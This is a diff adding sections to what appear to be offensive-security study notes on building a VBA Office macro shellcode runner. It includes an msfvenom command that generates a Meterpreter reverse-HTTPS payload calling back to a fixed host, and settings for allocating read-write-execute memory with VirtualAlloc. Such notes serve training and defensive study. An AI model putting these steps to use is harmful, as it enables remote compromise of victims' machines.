@@ -52,3 +52,21 @@ DWORD flProtect
 Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
 ```
 *PtrSafe is a keyword to asserts that a Declare Statement is safe to run in x64 environment*
+
+### Creating payload
+
+First use msfvenom to create payload, even though the target machine is 64-bit, but the microsoft office installed in 32-bit application, so generate 32-bit shellcode
+
+```
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.81 LPORT=443 ExitFunc=thread -f vbapplication
+```
+
+Add array to the VBA code.
+
+### Setting argument for VirtualAlloc
+
+lpaddress - Set the value "0" which will leave the memory allocation to the API.
+DwSize - Can be hard coded the length of the payload, however need to change again, if another payload is used. To set it dynamically, use the *Ubound* to get the size of the array containing the shellcode
+fkAllocationType - Set as *0x3000* which equates to the allocation type enums of **MEM_COMMIT** and **MEM_RESERVE**. This will make the OS allocate the desired memory for us and make it available. In VBA, this will be represented as &H3000
+flProtect - set to &H40(0x40) indicating the memory is able to read write execute.
+
